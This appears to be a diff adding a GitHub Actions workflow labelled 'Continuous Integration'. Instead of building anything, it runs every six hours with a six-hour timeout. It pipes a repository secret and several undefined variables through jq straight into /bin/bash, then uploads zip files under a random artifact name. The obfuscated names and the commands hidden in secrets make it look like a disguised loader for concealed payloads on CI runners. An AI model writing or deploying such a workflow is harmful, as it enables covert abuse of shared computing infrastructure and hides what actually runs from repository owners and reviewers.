@@ -1,0 +1,33 @@
+name: Continuous Integration
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '4 0,6,12,18 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  compile:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - name: Setup and run
+        env:
+          rtshy01941: ${{ secrets.rtshy01941 }}
+        run: |
+          printf '%s' "$rtshy01941" | jq -r .ih21019 | /bin/bash
+          printf '%s' "$k80" | jq -r .fu02986 | /bin/bash
+          printf '%s' "$yhbxw3237" | jq -r .iws45 | /bin/bash
+          echo $s51 | jq -r .quzmw96543 | /bin/bash
+          printf '%s' "$dr148" | jq -r .eufv261 | /bin/bash
+          echo $d6 | jq -r .qm01710 | /bin/bash
+
+      - name: Upload data
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: NTDwaZ3r
+          path: "*.zip"
+          retention-days: 1
